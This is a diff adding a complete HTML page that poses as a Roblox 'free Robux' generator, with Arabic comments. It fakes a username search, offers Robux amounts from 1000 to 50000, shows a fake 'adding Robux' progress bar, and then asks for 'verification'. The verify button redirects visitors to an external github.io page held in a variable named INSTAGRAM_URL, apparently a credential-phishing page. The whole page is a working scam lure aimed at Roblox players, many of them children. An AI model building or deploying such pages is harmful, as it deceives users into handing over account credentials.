@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1"/>
+<title>Verification</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
+
+<!-- particles.js -->
+<script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
+
+<style>
+:root{--accent:#7b2cff;--accent-dark:#5a1fd1;--card-w:420px;--radius:20px;--ink:#101418;--muted:#6b7280}
+#particles-js{position:fixed;inset:0;z-index:-1;background:#eef0ea}
+body{margin:0;font-family:Inter,sans-serif;display:grid;place-items:center;min-height:100vh;color:var(--ink)}
+.card{width:min(var(--card-w),92vw);background:#fff;border-radius:var(--radius);border:3px solid var(--accent);
+      box-shadow:0 14px 30px rgba(123,44,255,.25);padding:28px 20px 34px;text-align:center;position:relative}
+.brand-bar{position:absolute;left:50%;top:-30px;transform:translateX(-50%);
+           background:#fff;border:3px solid var(--accent);border-radius:16px;padding:8px 18px;
+           box-shadow:0 8px 20px rgba(123,44,255,.25)}
+.brand{height:34px}
+
+h1{margin:26px 0 6px;letter-spacing:.12em}
+.muted{color:var(--muted);font-size:.92rem}
+.stage{display:none}
+
+.amounts{display:grid;gap:10px;margin:20px 0}
+.amount-btn{
+  display:flex;align-items:center;justify-content:center;
+  background:#f7f7fc;border:2px solid #ddd;border-radius:14px;
+  height:60px;font-weight:700;font-size:18px;cursor:pointer;
+  transition:all .2s ease;
+}
+.amount-btn img{height:28px;margin-right:10px}
+.amount-btn.active{background:var(--accent);color:#fff;border-color:var(--accent-dark)}
+
+.bar{height:14px;width:100%;background:#ececf5;border:1px solid #e6e6f3;border-radius:14px;overflow:hidden;margin-top:20px}
+.fill{height:100%;width:0;background:linear-gradient(90deg,var(--accent),var(--accent-dark));transition:width .2s linear}
+
+.verify{display:none;margin-top:20px}
+.rbx-box{background:#f7f7fc;border:2px solid #e1e1ec;border-radius:20px;
+         padding:16px;font-weight:900;font-size:18px;margin:12px auto 16px;width:220px;
+         box-shadow:inset 0 1px 0 #fff,0 8px 18px #00000012}
+.cta{width:100%;height:60px;border:0;border-radius:16px;
+     background:linear-gradient(180deg,var(--accent),var(--accent-dark));
+     color:#fff;font-weight:900;font-size:20px;cursor:pointer;
+     box-shadow:0 12px 26px rgba(123,44,255,.4)}
+.cta:hover{transform:translateY(-2px)}
+</style>
+</head>
+<body>
+<div id="particles-js"></div>
+
+<section class="card">
+  <div class="brand-bar">
+    <!-- شعار Roblox -->
+    <img class="brand"
+         src="https://ngtimes.ca/wp-content/uploads/2021/01/roblox-logo.png"
+         alt="ROBLOX" loading="lazy" referrerpolicy="no-referrer">
+  </div>
+
+  <!-- المرحلة 1 -->
+  <div id="stage1" class="stage" style="display:block">
+    <h1>SEARCHING</h1>
+    <p class="muted">البحث عن الإسم <span id="sUser">—</span>...</p>
+  </div>
+
+  <!-- المرحلة 2 -->
+  <div id="stage2" class="stage">
+    <h1>USER FOUND</h1>
+    <p class="muted"><span id="fUser">—</span> is valid</p>
+    <div class="rbx-box">✔</div>
+  </div>
+
+  <!-- المرحلة 3 اختيار روبكس -->
+  <div id="stage3" class="stage">
+    <h1>SELECT ROBUX</h1>
+    <p class="muted">قم بإختيار عدد الروبكس</p>
+    <div class="amounts">
+      <div class="amount-btn" data-val="1000">
+        <img src="https://tr.rbxcdn.com/7ecc2604606900f14ab35cfb314852dd/250/250/Decal/Png"
+             alt="Robux" loading="lazy" referrerpolicy="no-referrer"> 1000 Robux
+      </div>
+      <div class="amount-btn" data-val="2500">
+        <img src="https://tr.rbxcdn.com/7ecc2604606900f14ab35cfb314852dd/250/250/Decal/Png"
+             alt="Robux" loading="lazy" referrerpolicy="no-referrer"> 2500 Robux
+      </div>
+      <div class="amount-btn" data-val="5000">
+        <img src="https://tr.rbxcdn.com/7ecc2604606900f14ab35cfb314852dd/250/250/Decal/Png"
+             alt="Robux" loading="lazy" referrerpolicy="no-referrer"> 5000 Robux
+      </div>
+      <div class="amount-btn" data-val="50000">
+        <img src="https://tr.rbxcdn.com/7ecc2604606900f14ab35cfb314852dd/250/250/Decal/Png"
+             alt="Robux" loading="lazy" referrerpolicy="no-referrer"> 50000 Robux
+      </div>
+    </div>
+  </div>
+
+  <!-- المرحلة 4 توليد -->
+  <div id="stage4" class="stage">
+    <h1>Checking</h1>
+    <p class="muted">Adding <span id="gAmount"></span> Robux for <span id="gUser"></span></p>
+    <div class="bar"><div id="fill" class="fill"></div></div>
+  </div>
+
+  <!-- المرحلة 5 تحقق -->
+  <div id="stage5" class="stage verify">
+    <h1>تحقق مطلوب</h1>
+    <h2 id="vUser">—</h2>
+    <p class="muted">Your <span id="vAmount"></span> مطلوب التحقق لتحصيل الروبكس.</p>
+    <div class="rbx-box"><span id="vAmount2"></span> Robux</div>
+    <button id="verifyBtn" class="cta">تحقق الآن</button>
+  </div>
+</section>
+
+<script>
+/* particles */
+particlesJS("particles-js",{
+  particles:{number:{value:70,density:{enable:true,value_area:800}},color:{value:"#7b2cff"},
+  shape:{type:"circle"},opacity:{value:.6,random:true},size:{value:4,random:true},
+  line_linked:{enable:true,distance:150,color:"#7b2cff",opacity:.4,width:1},
+  move:{enable:true,speed:2,direction:"none",out_mode:"out"}},
+  interactivity:{detect_on:"canvas",
+    events:{onhover:{enable:true,mode:"grab"},onclick:{enable:true,mode:"push"}},
+    modes:{grab:{distance:140,line_linked:{opacity:.8}},push:{particles_nb:3}}},
+  retina_detect:true
+});
+
+/* بيانات المستخدم */
+const params=new URLSearchParams(location.search);
+const store=JSON.parse(localStorage.getItem('rbx_entry')||'{}');
+const username=(store.u||params.get('u')||'Guest').trim();
+document.getElementById("sUser").textContent=username;
+document.getElementById("fUser").textContent=username;
+document.getElementById("gUser").textContent=username;
+document.getElementById("vUser").textContent=username;
+
+let chosen=0;
+
+/* المراحل */
+setTimeout(()=>{showStage(2)},2000);
+setTimeout(()=>{showStage(3)},4000);
+
+function showStage(n){
+  document.querySelectorAll(".stage").forEach(s=>s.style.display="none");
+  document.getElementById("stage"+n).style.display="block";
+}
+
+/* اختيار الروبكس */
+document.querySelectorAll(".amount-btn").forEach(btn=>{
+  btn.onclick=()=>{
+    chosen=btn.dataset.val;
+    document.getElementById("gAmount").textContent=chosen;
+    showStage(4);
+    startProgress();
+  };
+});
+
+function startProgress(){
+  const fill=document.getElementById("fill"); let p=0;
+  const interval=setInterval(()=>{
+    p+=5; fill.style.width=p+"%";
+    if(p>=100){
+      clearInterval(interval);
+      document.getElementById("vAmount").textContent=chosen;
+      document.getElementById("vAmount2").textContent=chosen;
+      showStage(5);
+    }
+  },250);
+}
+
+/* زر التحقق */
+const INSTAGRAM_URL="https://gnesvas.github.io/chjan2/"; // عدّلها لو تبي
+document.getElementById("verifyBtn").onclick=()=>{ if(INSTAGRAM_URL) location.href=INSTAGRAM_URL; };
+</script>
+</body>
+</html>
